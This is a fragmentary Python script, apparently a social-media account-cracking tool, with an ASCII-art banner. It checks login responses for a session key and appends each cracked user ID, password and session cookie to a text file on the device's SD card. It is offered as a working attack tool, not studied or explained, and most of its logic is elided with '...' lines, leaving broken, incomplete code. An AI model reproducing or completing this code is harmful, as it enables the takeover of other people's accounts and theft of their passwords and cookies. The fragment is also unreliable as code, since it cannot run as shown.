...
\____    /   __   \   |\      \______  \______  \______  \
  /     /\____    /   |/   |   \  /    /   /    /   /    /
 /     /_   /    /|   /    |    \/    /   /    /   /    / 
/_______ \ /____/ |___\____|__  /____/   /____/   /____/  
        \/                    \/                          
--------------------------------------------------------
UPDATED VERSION OK Z9IN7XAITZAZ
--------------------------------------------------------
                                ...
                                if 'session_key' in po:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        open('/sdcard/AKING-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                                        break
                                        except:
